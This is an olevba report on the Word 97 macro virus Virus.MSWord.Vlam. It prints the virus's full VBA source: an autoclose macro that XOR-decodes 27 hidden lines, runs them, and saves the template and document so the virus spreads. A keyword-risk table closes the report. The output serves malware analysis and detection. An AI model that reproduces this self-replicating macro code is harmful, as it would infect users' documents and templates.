olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vlam
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vlam - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Vlam - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoclose()
'WM97.VLAM
Dim lines(27) As String
lines(1) = "ĘëĄŔ÷÷ę÷Ą×ŕöđčŕĄËŕýń"
lines(2) = "ÖŕńĄëę÷Ą¸ĄËę÷čäéŃŕčőéäńŕ«ÓÇŐ÷ęďŕćń«ÓÇĆęčőęëŕëńö­´¬«ĆęáŕČęáđéŕ"
lines(3) = "ÖŕńĄáęćĄ¸ĄÄćńěóŕÁęćđčŕëń«ÓÇŐ÷ęďŕćń«ÓÇĆęčőęëŕëńö­´¬«ĆęáŕČęáđéŕ"
lines(4) = "ÖŕńĄńíöĄ¸ĄŃíěöÁęćđčŕëń«ÓÇŐ÷ęďŕćń«ÓÇĆęčőęëŕëńö­´¬«ĆęáŕČęáđéŕ"
lines(5) = "ęđ÷ćęáŕĄ¸Ąńíö«éěëŕö­´©Ąńíö«ćęđëńęăéěëŕö¬"
lines(6) = "ŇěńíĄëę÷"
lines(7) = "«áŕéŕńŕéěëŕöĄ´©Ąëę÷«ćęđëńęăéěëŕö"
lines(8) = "«ěëöŕ÷ńéěëŕöĄ´©Ąęđ÷ćęáŕ"
lines(9) = "ŔëáĄŇěńí"
lines(10) = "ŇěńíĄáęć"
lines(11) = "«áŕéŕńŕéěëŕöĄ´©Ąáęć«ćęđëńęăéěëŕö"
lines(12) = "«ěëöŕ÷ńéěëŕöĄ´©Ąęđ÷ćęáŕ"
lines(13) = "ŔëáĄŇěńí"
lines(14) = "ŇěńíĄĘőńěęëö"
lines(15) = "«Óě÷đöŐ÷ęńŕćńěęëĄ¸Ą­×ëáĄŻĄµ¬"
lines(16) = "«Ćęëăě÷čĆęëóŕ÷öěęëöĄ¸Ą­×ëáĄŻĄµ¬"
lines(17) = "«ÖäóŕËę÷čäéŐ÷ęčőńĄ¸Ą­×ëáĄŻĄµ¬"
lines(18) = "«Äőőéěćäńěęë«ÖíęňÓěöđäéÇäöěćŔáěńę÷Ą¸Ą­×ëáĄŻĄµ¬"
lines(19) = "«Äőőéěćäńěęë«ĆęččäëáÇä÷ö­§Ńęęéö§¬«Ćęëń÷ęéö­§čäć÷ę§¬«ŔëäçéŕáĄ¸Ą­×ëáĄŻĄµ¬"
lines(20) = "«Äőőéěćäńěęë«ŔëäçéŕĆäëćŕéÎŕüĄ¸ĄňáĆäëćŕéÁěöäçéŕá"
lines(21) = "«Äőőéěćäńěęë«Öć÷ŕŕëĐőáäńěëâĄ¸Ą­×ëáĄŻĄµ¬"
lines(22) = "«ÖŕëáČäěéÄńńäćíĄ¸Ą´"
lines(23) = "ŔëáĄŇěńí"
lines(24) = "ĚăĄÁäü­Ëęň­¬¬Ą¸Ą·˛ĄÄëáĄÍęđ÷­Ëęň­¬¬ĄąĄ´µĄŃíŕë"
lines(25) = "ěĄ¸ĄĚëń­×ëáĄŻĄ´µ¬"
lines(26) = "ĆęččäëáÇä÷ö­ě¬«Ćęëń÷ęéö­ě¬«ŔëäçéŕáĄ¸Ą­×ëáĄŻĄµ¬"
lines(27) = "ŔëáĄĚă"
For y = 1 To 27
mycode = mycode & Crypt(lines(y)) & vbCr
Next
ThisDocument.VBProject.VBComponents(1).CodeModule.insertlines 48, mycode
Call runme
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.Save
NormalTemplate.Save
End Sub
Private Function Crypt(OldString)
For i = 1 To Len(OldString)
Crypt = Crypt & Chr(Asc(Mid(OldString, i, 1)) Xor 133)
Next
End Function

Private Sub runme()

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

